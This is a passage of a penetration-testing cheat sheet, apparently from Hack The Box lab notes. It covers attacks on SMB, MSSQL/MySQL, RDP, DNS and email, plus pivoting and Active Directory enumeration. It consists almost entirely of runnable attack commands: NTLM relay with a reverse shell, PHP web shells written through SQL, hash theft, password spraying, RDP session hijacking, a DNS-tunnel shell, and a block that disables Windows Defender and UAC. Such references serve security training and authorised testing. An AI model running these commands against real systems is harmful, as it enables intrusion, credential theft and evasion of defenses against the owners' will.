export KRB5CCNAME=/tmp/jpinkman.ccache
klist

# When pkinit disable , read below 
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
```
## Attacking Common Services

##### Attacking SMB

```
(https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

# Network share enumeration using smbmap.
smbmap -H 10.129.14.128

# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Automated enumeratition of the SMB service using enum4linux-ng. (https://github.com/cddmp/enum4linux-ng) 
./enum4linux-ng.py 10.10.11.45 -A -C

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerating Logged-on users.
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```
##### Attacking SQL
```
# Enable xp_cmdshell (need priv) and execute command in MSSQL
1> EXECUTE sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> EXECUTE sp_configure 'xp_cmdshell', 1
6> GO
7> RECONFIGURE
8> GO

1> xp_cmdshell 'whoami'

# Hash stealing using the xp_dirtree command in MSSQL with Responder.
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

# Hash stealing using the xp_subdirs command in MSSQL with Responder.
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

# MSSQL - Enable Ole Automation Procedures ( priv need to write) and Check current user and permissions and  Write Local File and  Read Local File

(Enable Ole Automation Procedures)

1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

(Check current user and permissions)
1> SELECT SUSER_SNAME();
2> GO

(Write Local File)

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO

(Read Local File)

1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

# Impersonate Existing Users with MSSQL

(Identify Users that We Can Impersonate)

1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

(Verifying our Current User and Role)

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

(Impersonating the SA User)

1> USE master
2> EXECUTE AS LOGIN = 'sa'
3> SELECT SYSTEM_USER
4> SELECT IS_SRVROLEMEMBER('sysadmin')
5> GO

# Communicate with Other Databases with MSSQL

(Identify linked Servers in MSSQL)

1> SELECT srvname, isremote FROM sysservers
2> GO

(Identify the user and its privileges used for the remote connection in MSSQL)

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO



# MySQL - Write Local File
show variables like "secure_file_priv";
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

# MySQL - Read Local File
select LOAD_FILE("/etc/passwd");

```
##### Attacking RDP Services
```
# Password spraying against the RDP service using crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

# Connect to the RDP service using rdesktop in Linux.
rdesktop -u admin -p password123 192.168.2.143

# List user logged in and this session in machine
query user

# 	Impersonate a user without its password and Execute the RDP session hijack. ( need priv SYSTEM)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack

# Enable "Restricted Admin Mode" on the target Windows host.
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
##### Attacking DNS Services
```
# DIG - AXFR Zone Transfer
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
or
dig axfr windcorp.thm @192.168.150.100

# DIG - Reverse DNS Lookup
dig -x 10.129.227.180 @192.168.150.100

# DIG - DNS Record Enumeration (ANY)
dig windcorp.thm @192.168.150.100 ANY

# Enumerate the CNAME records for those subdomains
host support.inlanefreight.com

# Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer (https://github.com/mschwager/fierce) 
fierce --domain zonetransfer.me

# Subdomain Enumeration by subfinder  (https://github.com/projectdiscovery/subfinder)
./subfinder -d inlanefreight.com -v

# Subdomain Enumeration by Subbrute  (https://github.com/TheRook/subbrute)
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt 
```
##### Attacking Email Services
```
# DNS lookup for mail servers for the specified domain
host -t MX microsoft.com

#  DNS lookup for mail servers for the specified domain
dig mx inlanefreight.com | grep "MX" | grep -v ";"

#  DNS lookup of the IPv4 address for the specified subdomain.
host -t A mail1.inlanefreight.htb.

# Connect to the SMTP server.
telnet 10.10.110.20 25

# SMTP user enumeration using the RCPT command against the specified host
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Verify the usage of Office365 for the specified domain. (https://github.com/0xZDH/o365spray)
python3 o365spray.py --validate --domain msplaintext.xyz

# Enumerate existing users using Office365 on the specified domain.
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

# python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
Password spraying against a list of users that use Office365 for the specified domain.

# Brute-forcing the POP3 service.
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# Testing the SMTP service for the open-relay vulnerability.
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213  
```
## Pivoting, Tunneling, and Port Forwarding

#### Dynamic Port Forwarding with SSH and SOCKS Tunneling
```
# SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>

# Forwarding Multiple Ports
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>

# SSH command used to perform a dynamic port forward on port 9050 or 1080 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.
ssh -D 9050 ubuntu@<IPaddressofTarget>
/etc/proxychains.conf  need have (socks4 	127.0.0.1 9050)
or
ssh -D 1080 ubuntu@<IPaddressofTarget>
/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
```
##### Remote or Reverse Port Forwarding with SSH
```
# SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN
```
##### Meterpreter Tunneling and Port Forwarding
```
# Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. (Bind Shell)
meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>

# Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host. (Reverse Shell)
meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
```
##### Socat Redirection with a Reverse Shell or Bind Shell
```
# Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. (Reverse Shell)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. (Bind Shell)
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
```
##### SSH for Windows with Plink
```
# Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.
plink -D 9050 ubuntu@<IPaddressofTarget>
```
##### SSH Pivoting with Sshuttle
```
# Uses apt-get to install the tool sshuttle.
sudo apt-get install sshuttle

# Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```
##### Web Server Pivoting with Rpivot
```
# Cloning rpivot
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7

# Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).
python2.7 client.py --server-ip <IPaddressofAttackHost> --server-port 9999

# Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
##### Port Forwarding with Windows Netsh
```
# Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25

# Windows-based command used to view the configurations of a portproxy rule called v4tov4.
netsh.exe interface portproxy show v4tov4
```
##### DNS Tunneling with Dnscat2
```
# Clones the dnscat2 project GitHub repository.
git clone https://github.com/iagox86/dnscat2.git

# Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Clones the dnscat2-powershell project Github repository.
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# PowerShell command used to import the dnscat2.ps1 tool.
Import-Module .\dnscat2.ps1

# PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
##### SOCKS5 Tunneling with Chisel
```
# Clones the chisel project GitHub repository.
git clone https://github.com/jpillora/chisel.git ; cd chisel ; go build

# Running the Chisel Server on the Pivot Host and Connecting to the Chisel Server
./chisel server -v -p 1234 --socks5                     ( run on Pivot Host)
./chisel client -v 10.129.202.64:1234 socks             ( run on attack Host)
/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)

# Chisel Reverse Pivot ,  Starting the Chisel Server on our Attack Host 
sudo ./chisel server --reverse -v -p 1234 --socks5                   ( run on attack Host)
./chisel client -v 10.10.14.17:1234 R:socks                          ( run on Pivot Host)
/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
```
##### ICMP Tunneling with SOCKS
```
# Clones the ptunnel-ng project GitHub repository and Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.
git clone https://github.com/utoni/ptunnel-ng.git ; sudo ./autogen.sh 

# Starting the ptunnel-ng Server on the Target Host
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Connecting to ptunnel-ng Server from Attack Host
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Enabling Dynamic Port Forwarding over SSH
ssh -D 9050 -p2222 -lubuntu 127.0.0.1  
```
##### RDP and SOCKS Tunneling with SocksOverRDP
```
# Windows-based command used to register the SocksOverRDP-PLugin.dll. (https://github.com/nccgroup/SocksOverRDP)
regsvr32.exe SocksOverRDP-Plugin.dll   
```
##### [Pivoting with ligolo-ng](https://github.com/nicocha30/ligolo-ng)
```
# Download Proxy and  Agent of ligolo-ng .  (https://github.com/nicocha30/ligolo-ng)
mkdir ligolo && cd ligolo
(Download Proxy  for Linux)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

(Download Agent  for Windows)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip

(Download Agent  for Linux)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvf  ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Configure the TUN Interface on the attacker's machine.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Run a proxy on the attacker's machine.
./proxy -laddr 0.0.0.0:11601 -selfcert

# Run the Agent on the victim's machine (Pivot Host).
agent.exe -connect 10.10.14.18:11601 -ignore-cert

# Activate Tunnel on the Proxy interface.  ( run in proxy)
session       (Display a list of all connected agents.)
ifconfig      (Check the victim's network cards and IP addresses)
use <ID>      (Select the specific Agent to work with.)
id            (View information about the user running the agent)
listener_list (Listing listener have add )
start
kill          (Disconnect a specific agent)

# Add a ligolo route on the attacker's machine.
sudo ip route add 172.16.5.0/24 dev ligolo    (done)         ( run in hacer shell)
 
# Setting Reverse Shell in proxy
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp   ( run in proxy)

# Command need to triple pivot 
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601       ( run in proxy)

# setting to Access the Agent's own Localhost.
sudo ip route add 240.0.0.1/32 dev1 ligolo                   ( run in hacer shell)

# Command need to run  , ping , fping and nmap in pivot 
for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from" & done

fping -asgq 172.16.5.0/24

nmap -sT -Pn --unprivileged --send-eth 172.16.6.45

# Get infor of ligolo
ip route show dev ligolo

# Setting new ligolo2 router 
sudo ip tuntap add user $(whoami)  mode tun ligolo2
sudo ip link set ligolo2 up

start --tun ligolo2  (proxy)

sudo ip route add 172.16.6.0/24 dev ligolo2
```
## Active Directory

#### Tools of the Trade
```
# List tool in hackthebox
https://academy.hackthebox.com/module/143/section/1517
```
#### Initial Enumeration
```
# Identify the servers holding the five FSMO (Flexible Single Master Operations) roles within an Active Directory (AD) Forest
netdom query fsmo

# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.  
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```
##### LLMNR/NTB-NS Poisoning
```
# LLMNR/NBT-NS Poisoning - from Linux
sudo responder -I ens224 
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

# LLMNR/NBT-NS Poisoning - from Windows (https://github.com/Kevin-Robertson/Inveigh)
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
or
.\Inveigh.exe
```
##### Password Spraying and Password Policies
```
# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# ses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option.
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
import-module .\PowerView.ps1
Get-DomainPolicy

# Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.  (https://github.com/dafthack/DomainPasswordSpray)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue


# Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.  (https://github.com/ropnop/windapsearch)
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.
./windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.
./windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

```
##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
```
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.
$ExecutionContext.SessionState.LanguageMode

# A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.  (https://github.com/leoloobeek/LAPSToolkit)
Find-LAPSDelegatedGroups

# A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.
Find-AdmPwdExtendedRights

# A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.
Get-LAPSComputers
```
##### Enumerating Security Controls
```
# PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.
Get-MpComputerStatus

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
$ExecutionContext.SessionState.LanguageMode

# A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.  (https://github.com/leoloobeek/LAPSToolkit)
Find-LAPSDelegatedGroups

# A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.
Find-AdmPwdExtendedRights

# A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.
Get-LAPSComputers
```
##### Credentialed Enumeration from Linux
```
# Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host.
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (--dir-only) in the share. Performed from a Linux-based host.
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only

# Enumerates a target user account in a Windows domain using its relative identifier (0x457). Discovers user accounts in a target Windows domain and their associated relative identifiers (rid).  Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5
rpcclient $> queryuser 0x457
rpcclient $> enumdomusers

# Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da

# Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU
```
##### Credentialed Enumeration from Windows
```
# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
Get-Module

# Loads the Active Directory PowerShell module from a Windows-based host.
Import-Module ActiveDirectory

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
Get-ADDomain

# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
Get-ADTrust -Filter * | select name

# PowerShell cmd-let used to search for a specifc group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroup -Identity "Backup Operators"

# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroupMember -Identity "Backup Operators"

# use SharpView to get help
.\SharpView.exe Get-DomainUser -Help

# use SharpView to enumerate information about a specific user
.\SharpView.exe Get-DomainUser -Identity forend

# Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.  (https://github.com/SnaffCon/Snaffler)
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data

# running the SharpHound.exe collector
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
##### [Credentialed Enumeration from Windows with PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) 
```
# PowerView script used to append results to a CSV file. Performed from a Windows-based host.
import-module .\PowerView.ps1
Export-PowerViewCSV

# PowerView script used to convert a User or Group name to it's SID. Performed from a Windows-based host.
ConvertTo-SID

# PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.
Get-DomainSPNTicket

________________________________________________________________________________________
(Domain/LDAP Functions)
________________________________________________________________________________________

# PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.
Get-Domain

# PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.
Get-DomainController

# PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.
Get-DomainUser

# PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.
Get-DomainComputer

# PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.
Get-DomainGroup

# PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.
Get-DomainOU

# PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.
Find-InterestingDomainAcl

# PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.
Get-DomainGroupMember

# PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.
Get-DomainFileServer

# PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.
Get-DomainDFSShare

________________________________________________________________________________________
(GPO Functions)
________________________________________________________________________________________

# PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.
Get-DomainGPO

# PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.
Get-DomainPolicy
________________________________________________________________________________________
(Computer Enumeration Functions)
________________________________________________________________________________________

# PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.
Get-NetLocalGroup

# PowerView script enumerate members of a specific local group. Performed from a Windows-based host.
Get-NetLocalGroupMember

# PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.
Get-NetShare

# PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.
Get-NetSession

# PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.
Test-AdminAccess

________________________________________________________________________________________
(Threaded 'Meta'-Functions)
________________________________________________________________________________________

# PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.
Find-DomainUserLocation

# PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.
Find-DomainShare

# PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.
Find-InterestingDomainShareFile

# PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.
Find-LocalAdminAccess

________________________________________________________________________________________
(Domain Trust Functions)
________________________________________________________________________________________

# PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.
Get-DomainTrust

# PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.
Get-ForestTrust

# PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.
Get-DomainForeignUser

# PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.
Get-DomainForeignGroupMember

# PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.
Get-DomainTrustMapping

# PowerView script that enumerates all of Domain User Information (mmorgan). Performed from a Windows-based host.
 Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# PowerView script used to Testing for Local Admin Access. Performed from a Windows-based host.
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
##### Enumeration by Living Off the Land
```
________________________________________________________________________________________
(Basic Enumeration Commands)
________________________________________________________________________________________

# Prints the PC's Name
hostname

# Prints out the OS version and revision level
[System.Environment]::OSVersion.Version

# Prints the patches and hotfixes applied to the host
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Prints a summary of the host's information
systeminfo

# Prints out network adapter state and configurations
ipconfig /all

